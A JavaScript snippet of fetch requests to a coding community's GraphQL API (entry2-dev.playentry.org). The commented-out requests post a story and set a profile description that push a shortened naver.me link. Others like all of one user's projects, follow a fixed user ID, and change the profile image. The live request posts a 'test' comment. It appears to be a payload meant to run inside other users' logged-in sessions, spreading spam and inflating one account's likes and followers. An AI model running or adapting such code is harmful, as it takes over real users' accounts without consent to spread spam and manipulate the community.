//code made by jansang
//fetch("https://entry2-dev.playentry.org/graphql", {"headers": {"content-type": "application/json",},"body": "{\"query\":\"\\n    mutation CREATE_ENTRYSTORY(\\n        \\n    $content: String\\n    $text: String\\n    $image: String\\n    $sticker: String\\n    $cursor: String\\n\\n    ) {\\n        createEntryStory(\\n            \\n    content: $content\\n    text: $text\\n    image: $image\\n    sticker: $sticker\\n    cursor: $cursor\\n\\n        ) {\\n            warning\\n            discuss{\\n                \\n    id\\n    title\\n    content\\n    seContent\\n    created\\n    commentsLength\\n    likesLength\\n    visit\\n    category\\n    prefix\\n    groupNotice\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n      width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    images {\\n        filename\\n        imageUrl\\n    }\\n    progress\\n    thumbnail\\n    reply\\n    bestComment {\\n        \\n    id\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    content\\n    created\\n    removed\\n    blamed\\n    commentsLength\\n    likesLength\\n    isLike\\n    hide\\n    image {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n   filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    sticker {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n\\n    }\\n    blamed\\n\\n            }\\n        }\\n    }\\n\",\"variables\":{\"content\":\"이모티콘 닉네임 만드는 방법! http://naver.me/G8mOq0Av\"}}","method": "POST",});
//fetch("https://entry2-dev.playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    query SELECT_USER_PROJECTS(\\n        \\n    $user: String!\\n    $query: String\\n    $categoryCode: String\\n    $groupId: ID\\n    $pageParam: PageParam\\n    $isOpen: Boolean\\n    $except: [ID]\\n    $searchAfter: JSON\\n    $searchType: String\\n\\n    ) {\\n        userProjectList(\\n            \\n    user: $user\\n    query: $query\\n    categoryCode: $categoryCode\\n    groupId: $groupId\\n    pageParam: $pageParam\\n    isOpen: $isOpen\\n    except: $except\\n    searchAfter: $searchAfter\\n    searchType: $searchType\\n\\n    ) {\\n            total\\n            list {\\n                \\n    id\\n    name\\n    user {\\n        id\\n        username\\n        nickname\\n        profileImage {\\n            id\\n            filename\\n            imageType\\n        }\\n    }\\n    thumb\\n    isopen\\n    isPracticalCourse\\n    category\\n    categoryCode\\n    created\\n    updated\\n    special\\n    isForLecture\\n    isForStudy\\n    isForSubmit\\n    hashId\\n    complexity\\n    staffPicked\\n    ranked\\n    visit\\n    likeCnt\\n    comment\\n\\n            }\\n            searchAfter\\n        }\\n    }\\n","variables":{"searchType":"scroll","user":"618237cd602eab013a55bea2","term":"all","pageParam":{"display":122,"sort":"created"}}}',method:"POST"}).then(e=>e.json()).then(e=>{var n=e.data.userProjectList.list;console.log(n),n.forEach(function(e){fetch("https://entry2-dev.playentry.org/graphql",{headers:{"content-type":"application/json"},body:`{"query":"\\n    mutation LIKE($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\\n        like(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\\n            \\n    target\\n    targetSubject\\n    targetType\\n\\n        }\\n    }\\n","variables":{"target":"${e.id}","targetSubject":"project","targetType":"individual"}}`,method:"POST"})})});
//fetch("https://entry2-dev.playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation UPDATE_USERINFO (\\n        $profileImage: String, \\n        $coverImage: String, \\n        $description: String,\\n        $nickname: String,\\n        $gender: String\\n        $mobileKey: String\\n    ) {\\n        updateUserInfo(\\n            profileImage: $profileImage, \\n            coverImage: $coverImage, \\n            description: $description\\n            nickname: $nickname\\n            gender: $gender\\n            mobileKey: $mobileKey\\n        ) {\\n            \\n    status\\n    result\\n\\n        }\\n    }\\n","variables":{"profileImage":"628b3920227908de3f5b4867"}}',method:"POST"});
//fetch("https://entry2-dev.playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation FOLLOW(\\n        \\n    $user: String\\n\\n    ) {\\n        follow(\\n            \\n    user: $user\\n\\n        ) {\\n            \\n    id\\n    \\n    id\\n    user {\\n        id\\n        username\\n        nickname\\n        profileImage {\\n            \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n        }\\n        status {\\n            following\\n            follower\\n        }\\n        isFollow\\n        projects {\\n            id\\n            thumb\\n            name\\n        }\\n    }\\n\\n    \\n    id\\n    follow {\\n        id\\n        username\\n        nickname\\n        profileImage {\\n            \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n        }\\n        status {\\n            following\\n            follower\\n        }\\n        isFollow\\n        projects {\\n            id\\n            thumb\\n            name\\n        }\\n    }\\n\\n\\n        }\\n    }\\n","variables":{"user":"618237cd602eab013a55bea2"}}',method:"POST"});
//fetch("https://entry2-dev.playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    mutation UPDATE_USERINFO (\\n        $profileImage: String, \\n        $coverImage: String, \\n        $description: String,\\n        $nickname: String,\\n        $gender: String\\n        $mobileKey: String\\n    ) {\\n        updateUserInfo(\\n            profileImage: $profileImage, \\n            coverImage: $coverImage, \\n            description: $description\\n            nickname: $nickname\\n            gender: $gender\\n            mobileKey: $mobileKey\\n        ) {\\n            \\n    status\\n    result\\n\\n        }\\n    }\\n","variables":{"description":"임티닉네임 만드는 방법 ㄷㄷ http://naver.me/G8mOq0Av"}}',method:"POST"});
fetch("https://entry2-dev.playentry.org/graphql", {
  headers: {
    "content-type": "application/json"
  },
  //   referrer:
  //     "https://entry2-dev.playentry.org/community/qna/62de5fe2748b27003767ae01",
  //   referrerPolicy: "strict-origin-when-cross-origin",
  body: '{"query":"\\n    mutation CREATE_COMMENT(\\n        \\n    $content: String\\n    $image: String\\n    $sticker: String\\n    $target: String\\n    $targetSubject: String\\n    $targetType: String\\n    $groupId: ID\\n\\n    ) {\\n        createComment(\\n            \\n    content: $content\\n    image: $image\\n    sticker: $sticker\\n    target: $target\\n    targetSubject: $targetSubject\\n    targetType: $targetType\\n    groupId: $groupId\\n\\n        ) {\\n            warning\\n            comment {\\n                \\n    id\\n    user {\\n        \\n    id\\n    nickname\\n    username\\n    profileImage {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    status {\\n        following\\n        follower\\n    }\\n    description\\n    role\\n\\n    }\\n    content\\n    created\\n    removed\\n    blamed\\n    commentsLength\\n    likesLength\\n    isLike\\n    hide\\n    image {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n    sticker {\\n        \\n    id\\n    name\\n    label {\\n        \\n    ko\\n    en\\n    ja\\n    vn\\n\\n    }\\n    filename\\n    imageType\\n    dimension {\\n        \\n    width\\n    height\\n\\n    }\\n    trimmed {\\n        filename\\n        width\\n        height\\n    }\\n\\n    }\\n\\n            }\\n        }\\n    }\\n","variables":{"content":"test","target":"62de5fe2748b27003767ae01","targetSubject":"discuss","targetType":"individual"}}',
  method: "POST"
  //   mode: "cors",
  //   credentials: "include"
});
